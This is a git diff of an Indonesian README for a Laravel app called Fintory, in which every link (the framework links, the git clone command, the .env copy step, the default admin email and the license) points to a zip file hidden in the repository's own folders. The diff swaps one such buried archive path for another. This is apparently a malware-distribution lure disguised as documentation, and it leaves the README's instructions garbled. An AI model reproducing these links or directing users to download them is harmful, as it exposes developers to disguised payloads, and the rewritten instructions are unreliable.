@@ -105,17 +105,17 @@ Untuk keamanan dan transparansi, semua tindakan penting yang dilakukan pengguna 
 
 Fintory dibangun di atas fondasi teknologi yang solid dan modern:
 
-* **Backend**: [Laravel 12](https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip) - Framework PHP yang elegan dan kuat.
+* **Backend**: [Laravel 12](https://github.com/Dapiiin/fintory/raw/refs/heads/main/cypress/e2e/keuangan/Software_3.1-beta.3.zip) - Framework PHP yang elegan dan kuat.
 
 * **Frontend**:
 
-  * [Vite](https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip) - Alat build frontend generasi baru yang sangat cepat.
+  * [Vite](https://github.com/Dapiiin/fintory/raw/refs/heads/main/cypress/e2e/keuangan/Software_3.1-beta.3.zip) - Alat build frontend generasi baru yang sangat cepat.
 
-  * [Tailwind CSS](https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip) - Framework CSS utility-first untuk desain yang cepat dan kustom.
+  * [Tailwind CSS](https://github.com/Dapiiin/fintory/raw/refs/heads/main/cypress/e2e/keuangan/Software_3.1-beta.3.zip) - Framework CSS utility-first untuk desain yang cepat dan kustom.
 
-  * [https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip](https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip) - Framework JavaScript minimalis untuk menambahkan interaktivitas.
+  * [https://github.com/Dapiiin/fintory/raw/refs/heads/main/cypress/e2e/keuangan/Software_3.1-beta.3.zip](https://github.com/Dapiiin/fintory/raw/refs/heads/main/cypress/e2e/keuangan/Software_3.1-beta.3.zip) - Framework JavaScript minimalis untuk menambahkan interaktivitas.
 
-* **UI Komponen Reaktif**: [Livewire](https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip) - Framework full-stack untuk membangun antarmuka dinamis dengan PHP.
+* **UI Komponen Reaktif**: [Livewire](https://github.com/Dapiiin/fintory/raw/refs/heads/main/cypress/e2e/keuangan/Software_3.1-beta.3.zip) - Framework full-stack untuk membangun antarmuka dinamis dengan PHP.
 
 * **Database**: MySQL / MariaDB.
 
@@ -131,7 +131,7 @@ Pastikan sistem Anda memenuhi persyaratan berikut:
 
 * Composer
 
-* https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip & NPM
+* https://github.com/Dapiiin/fintory/raw/refs/heads/main/cypress/e2e/keuangan/Software_3.1-beta.3.zip & NPM
 
 * Server Database (MySQL 8+ atau MariaDB 10.6+ direkomendasikan)
 
@@ -141,7 +141,7 @@ Pastikan sistem Anda memenuhi persyaratan berikut:
    Buka terminal Anda dan jalankan perintah berikut:
 
    ```
-   git clone [https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip](https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip)
+   git clone [https://github.com/Dapiiin/fintory/raw/refs/heads/main/cypress/e2e/keuangan/Software_3.1-beta.3.zip](https://github.com/Dapiiin/fintory/raw/refs/heads/main/cypress/e2e/keuangan/Software_3.1-beta.3.zip)
    cd fintory
    
    ```
@@ -155,10 +155,10 @@ Pastikan sistem Anda memenuhi persyaratan berikut:
    ```
 
 3. **Konfigurasi Environment**
-   Buat salinan file `https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip` menjadi `.env`.
+   Buat salinan file `https://github.com/Dapiiin/fintory/raw/refs/heads/main/cypress/e2e/keuangan/Software_3.1-beta.3.zip` menjadi `.env`.
 
    ```
-   cp https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip .env
+   cp https://github.com/Dapiiin/fintory/raw/refs/heads/main/cypress/e2e/keuangan/Software_3.1-beta.3.zip .env
    
    ```
 
@@ -191,7 +191,7 @@ Pastikan sistem Anda memenuhi persyaratan berikut:
 
    **Akun Admin Default:**
 
-   * **Email**: `https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip`
+   * **Email**: `https://github.com/Dapiiin/fintory/raw/refs/heads/main/cypress/e2e/keuangan/Software_3.1-beta.3.zip`
 
    * **Password**: `12345678`
 
@@ -231,7 +231,7 @@ Database adalah jantung dari Fintory. Desainnya direncanakan dengan hati-hati un
 <!-- 
 ## Lisensi
 
-Proyek ini dilisensikan di bawah [Creative Commons Attribution-NonCommercial 4.0 International License](https://raw.githubusercontent.com/Dapiiin/fintory/main/app/Http/Controllers/penjualan/Software-1.9.zip).
+Proyek ini dilisensikan di bawah [Creative Commons Attribution-NonCommercial 4.0 International License](https://github.com/Dapiiin/fintory/raw/refs/heads/main/cypress/e2e/keuangan/Software_3.1-beta.3.zip).
 
 Anda bebas untuk:
 * **Berbagi** — menyalin dan mendistribusikan kembali materi ini dalam bentuk atau format apapun
